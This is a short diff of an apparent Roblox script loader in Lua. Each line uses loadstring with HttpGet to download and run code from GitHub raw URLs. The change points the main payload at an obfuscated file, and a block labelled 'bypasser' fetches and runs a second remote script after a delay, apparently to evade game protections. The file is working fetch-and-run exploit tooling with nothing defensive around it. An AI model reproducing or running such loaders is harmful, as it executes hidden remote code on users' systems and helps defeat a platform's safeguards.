@@ -1,5 +1,5 @@
 -- loader
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ravendsss/iva/refs/heads/main/main.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ravendsss/iva/refs/heads/main/script.obfuscated.lua"))()
 -- bypasser
 task.wait(15)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ravendsss/iva/refs/heads/main/sab.lua"))()
